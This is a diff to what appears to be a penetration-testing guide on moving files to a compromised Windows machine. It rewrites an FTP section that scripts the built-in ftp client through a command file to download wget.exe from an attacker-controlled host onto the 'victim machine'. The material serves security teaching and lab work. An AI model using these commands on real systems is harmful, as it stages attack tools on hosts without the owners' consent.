@@ -6,11 +6,20 @@ Why is this so much harder in Windows? I don't know.
 
 ## FTP
 
-Most windows machines have a ftp-client included. But we can't use it interactively since that most likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate.
+Even though many Windows versions have FTP clients, we can't use them interactively because it will kill shells. But we can run multiple commands from a file:  
 
-On the compromised machine we echo out the following commands into a file echo open 192.168.1.101 21&gt; ftp.txt echo USER username&gt;&gt; ftp.txt echo password&gt;&gt; ftp.txt echo bin&gt;&gt; ftp.txt echo GET wget.exe&gt;&gt; ftp.txt echo bye&gt;&gt; ftp.txt
+On the victim machine, echo the following commands into a file:
 
-Then run this command to connect to the ftp
+```text
+echo open [host] 21> ftp.txt
+echo USER username>> ftp.txt
+echo password>> ftp.txt
+echo bin>> ftp.txt
+echo GET wget.exe>> ftp.txt
+echo bye>> ftp.txt
+```
+
+Then run this command to connect:
 
 ```text
 ftp -v -n -s:ftp.txt
